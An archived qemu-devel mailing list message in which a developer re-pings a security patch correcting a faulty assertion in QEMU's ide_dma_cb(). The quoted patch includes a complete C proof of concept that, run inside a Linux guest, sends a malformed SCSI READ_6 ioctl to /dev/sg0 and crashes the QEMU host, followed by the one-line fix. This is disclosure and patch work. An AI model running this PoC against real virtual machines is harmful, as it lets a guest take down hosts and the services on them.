<!-- MHonArc v2.6.19+ -->
<!--X-Subject: Re: [QEMU&#45;SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest -->
<!--X-From-R13: Oyrknaqre Bbcbi &#60;nyrk.cbcbiNyvahk.pbz> -->
<!--X-Date: Wed, 06 Nov 2019 05:18:08 &#45;0500 -->
<!--X-Message-Id: d748c840&#45;56b7&#45;6dcd&#45;c82d&#45;fea0a4949e8d@linux.com -->
<!--X-Content-Type: text/plain -->
<!--X-Reference: 1562335669&#45;10127&#45;1&#45;git&#45;send&#45;email&#45;alex.popov@linux.com -->
<!--X-Head-End-->
<!doctype html public "-//W3C//DTD HTML//EN">
<html>
<head>
<title>Re: [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu D</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head>
<body>
<center>
<table border=0 cellspacing=2 cellpadding=0 bgcolor="#000000">
<tr><td><table border=0 bgcolor="#FFFFCC">
<tr><td><big><b>qemu-devel</b></big></td></tr></table></tr></table>
<div class="nowrap">
<small>[<a href="../"
>Top</a>][<a href="/archive/html">All Lists</a>]</small>
</div>
<form method="get" action="/archive/cgi-bin/namazu.cgi">
<input type="text" name="query" size="30">
<input type="submit" name="submit" value="Search">
<input type="hidden" name="idxname" value="qemu-devel">
<a href="/archive/cgi-bin/namazu.cgi?idxname=qemu-devel">Advanced</a>
</form>

</center>
<!--X-Body-Begin-->
<!--X-User-Header-->
<!--X-User-Header-End-->
<!--X-TopPNI-->
<hr>
[<a href="msg00596.html">Date Prev</a>][<a href="msg00598.html">Date Next</a>][<a href="msg00581.html">Thread Prev</a>][<a href="msg00645.html">Thread Next</a>][<a
href="index.html#00597">Date Index</a>][<a
href="threads.html#00597">Thread Index</a>]

<!--X-TopPNI-End-->
<!--X-MsgBody-->
<!--X-Subject-Header-Begin-->
<h2>Re: [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu D</h2>
<hr>
<table border=0>
<tbody>
<tr>
<td align="right" valign="top">
<b>From</b>: </td>
<td align="left">
Alexander Popov</td>
</tr>
<!--X-Subject-Header-End-->
<!--X-Head-of-Message-->

<tr>
<td align="right" valign="top">
<b>Subject</b>: </td>
<td align="left">
Re: [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</td>
</tr>

<tr>
<td align="right" valign="top">
<b>Date</b>: </td>
<td align="left">
Wed, 6 Nov 2019 13:17:51 +0300</td>
</tr>

<tr>
<td align="right" valign="top">
<b>User-agent</b>: </td>
<td align="left">
Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Thunderbird/68.1.1</td>
</tr>

</tbody>
</table>
<!--X-Head-of-Message-End-->
<!--X-Head-Body-Sep-Begin-->
<hr>
<!--X-Head-Body-Sep-End-->
<!--X-Body-of-Message-->
<pre>On 27.07.2019 00:09, Alexander Popov wrote:
&gt;<i> On 26.07.2019 2:25:03 GMT+02:00, John Snow &lt;address@hidden&gt; wrote:</i>
&gt;<i>&gt; Oh, this is fun.</i>
&gt;<i> ...</i>
&gt;<i>&gt; I can worry about a proper fix for 4.2+.</i>
&gt;<i></i>
&gt;<i> Hello John,</i>
&gt;<i></i>
&gt;<i> Thanks for your letter.</i>
&gt;<i></i>
&gt;<i> I double-checked the git history and mailing list, I'm still sure</i>
&gt;<i> that my fix for this assertion is correct.</i>

Hello!

I'm pointing politely to this issue again.

It crashes qemu during syzkaller fuzzing.

It's really annoying to manually apply the fix against it to qemu.

I'm quoting my patch from July that _correctly_ fixes the wrong assertion
introduced in the commit a718978ed58a.

Why don't you apply my commit and then do the refactoring later when you want?

Best regards,
Alexander


On 05.07.2019 17:07, Alexander Popov wrote:
&gt;<i> This assertion was introduced in the commit a718978ed58a in July 2015.</i>
&gt;<i> It implies that the size of successful DMA transfers handled in</i>
&gt;<i> ide_dma_cb() should be multiple of 512 (the size of a sector).</i>
&gt;<i> </i>
&gt;<i> But guest systems can initiate DMA transfers that don't fit this</i>
&gt;<i> requirement. Let's improve the assertion to prevent qemu DoS from quests.</i>
&gt;<i> </i>
&gt;<i> PoC for Linux that uses SCSI_IOCTL_SEND_COMMAND to perform such an ATA</i>
&gt;<i> command and crash qemu:</i>
&gt;<i> </i>
&gt;<i> #include &lt;stdio.h&gt;</i>
&gt;<i> #include &lt;sys/ioctl.h&gt;</i>
&gt;<i> #include &lt;stdint.h&gt;</i>
&gt;<i> #include &lt;sys/types.h&gt;</i>
&gt;<i> #include &lt;sys/stat.h&gt;</i>
&gt;<i> #include &lt;fcntl.h&gt;</i>
&gt;<i> #include &lt;string.h&gt;</i>
&gt;<i> #include &lt;stdlib.h&gt;</i>
&gt;<i> #include &lt;scsi/scsi.h&gt;</i>
&gt;<i> #include &lt;scsi/scsi_ioctl.h&gt;</i>
&gt;<i> </i>
&gt;<i> #define CMD_SIZE 2048</i>
&gt;<i> </i>
&gt;<i> struct scsi_ioctl_cmd_6 {</i>
&gt;<i>       unsigned int inlen;</i>
&gt;<i>       unsigned int outlen;</i>
&gt;<i>       unsigned char cmd[6];</i>
&gt;<i>       unsigned char data[];</i>
&gt;<i> };</i>
&gt;<i> </i>
&gt;<i> int main(void)</i>
&gt;<i> {</i>
&gt;<i>       intptr_t fd = 0;</i>
&gt;<i>       struct scsi_ioctl_cmd_6 *cmd = NULL;</i>
&gt;<i> </i>
&gt;<i>       cmd = malloc(CMD_SIZE);</i>
&gt;<i>       if (!cmd) {</i>
&gt;<i>               perror(&quot;[-] malloc&quot;);</i>
&gt;<i>               return 1;</i>
&gt;<i>       }</i>
&gt;<i> </i>
&gt;<i>       memset(cmd, 0, CMD_SIZE);</i>
&gt;<i>       cmd-&gt;inlen = 1337;</i>
&gt;<i>       cmd-&gt;cmd[0] = READ_6;</i>
&gt;<i> </i>
&gt;<i>       fd = open(&quot;/dev/sg0&quot;, O_RDONLY);</i>
&gt;<i>       if (fd == -1) {</i>
&gt;<i>               perror(&quot;[-] opening sg&quot;);</i>
&gt;<i>               return 1;</i>
&gt;<i>       }</i>
&gt;<i> </i>
&gt;<i>       printf(&quot;[+] sg0 is opened\n&quot;);</i>
&gt;<i> </i>
&gt;<i>       printf(&quot;[.] qemu should break here:\n&quot;);</i>
&gt;<i>       fflush(stdout);</i>
&gt;<i>       ioctl(fd, SCSI_IOCTL_SEND_COMMAND, cmd);</i>
&gt;<i>       printf(&quot;[-] qemu didn't break\n&quot;);</i>
&gt;<i> </i>
&gt;<i>       free(cmd);</i>
&gt;<i> </i>
&gt;<i>       return 1;</i>
&gt;<i> }</i>
&gt;<i> </i>
&gt;<i> Signed-off-by: Alexander Popov &lt;address@hidden&gt;</i>
&gt;<i> ---</i>
&gt;<i>  hw/ide/core.c | 2 +-</i>
&gt;<i>  1 file changed, 1 insertion(+), 1 deletion(-)</i>
&gt;<i> </i>
&gt;<i> diff --git a/hw/ide/core.c b/hw/ide/core.c</i>
&gt;<i> index 6afadf8..304fe69 100644</i>
&gt;<i> --- a/hw/ide/core.c</i>
&gt;<i> +++ b/hw/ide/core.c</i>
&gt;<i> @@ -868,7 +868,7 @@ static void ide_dma_cb(void *opaque, int ret)</i>
&gt;<i>  </i>
&gt;<i>      sector_num = ide_get_sector(s);</i>
&gt;<i>      if (n &gt; 0) {</i>
&gt;<i> -        assert(n * 512 == s-&gt;sg.size);</i>
&gt;<i> +        assert(n == s-&gt;sg.size / 512);</i>
&gt;<i>          dma_buf_commit(s, s-&gt;sg.size);</i>
&gt;<i>          sector_num += n;</i>
&gt;<i>          ide_set_sector(s, sector_num);</i>


</pre>
<!--X-Body-of-Message-End-->
<!--X-MsgBody-End-->
<!--X-Follow-Ups-->
<hr>
<form method="post" action="/mp/yyz.py" enctype="multipart/form-data">
<input type="hidden" name="a" value="alex.popov">
<input type="hidden" name="b" value="Re: [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest">
<input type="hidden" name="d" value="d748c840-56b7-6dcd-c82d-fea0a4949e8d@linux.com">
<input type="hidden" name="c" value="linux.com">
<center>reply via email to<br><input type="submit" value=" Alexander Popov "></center>
</form>
<hr>
<table width="100%">
<tr><td align="left">[Prev in Thread]</td>
<td align="center"><b>Current Thread</b></td>
<td align="right">[<a href="msg00645.html">Next in Thread</a>]</td></tr></table>
<ul>
<li><font color="#666666"><strong>Re: [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</strong>,
<em>Alexander Popov</em></font>&nbsp;<b>&lt;=</b>
<ul>
<li><b><a name="00645" href="msg00645.html">Re: [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</a></b>, <i>Michael S. Tsirkin</i>, <tt>2019/11/06</tt>
<ul>
<li><b><a name="00796" href="msg00796.html">Re: [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</a></b>, <i>Alexander Popov</i>, <tt>2019/11/06</tt>
</li>
</ul>
</li>
</ul>
<ul>

<li><b><a name="00644" href="msg00644.html">Re: [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</a></b>, <i>Michael S. Tsirkin</i>, <tt>2019/11/06</tt>
<ul>
<li><b><a name="00800" href="msg00800.html">Re: [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</a></b>, <i>Alexander Popov</i>, <tt>2019/11/06</tt>
<ul>
<li><b><a name="02166" href="msg02166.html">Re: [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</a></b>, <i>Alexander Popov</i>, <tt>2019/11/14</tt>
</li>
</ul>
</li>
</ul>
</li>
 </ul>
</li>
</ul>

<hr>
<!--X-Follow-Ups-End-->
<!--X-References-->
<!--X-References-End-->
<!--X-BotPNI-->
<ul>
<li>Prev by Date:
<strong><a href="msg00596.html">Re: [virtio-dev] Re: guest / host buffer sharing ...</a></strong>
</li>
<li>Next by Date:
<strong><a href="msg00598.html">Re: backup_calculate_cluster_size does not consider source</a></strong>
</li>
<li>Previous by thread:
<strong><a href="msg00581.html">Re: [PATCH v14 00/11] Build ACPI Heterogeneous Memory Attribute Table (HMAT)</a></strong>
</li>
<li>Next by thread:
<strong><a href="msg00645.html">Re: [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</a></strong>
</li>
<li>Index(es):
<ul>
<li><a href="index.html#00597"><strong>Date</strong></a></li>
<li><a href="threads.html#00597"><strong>Thread</strong></a></li>
</ul>
</li>
</ul>

<!--X-BotPNI-End-->
<!--X-User-Footer-->
<!--X-User-Footer-End-->
</body>
</html>
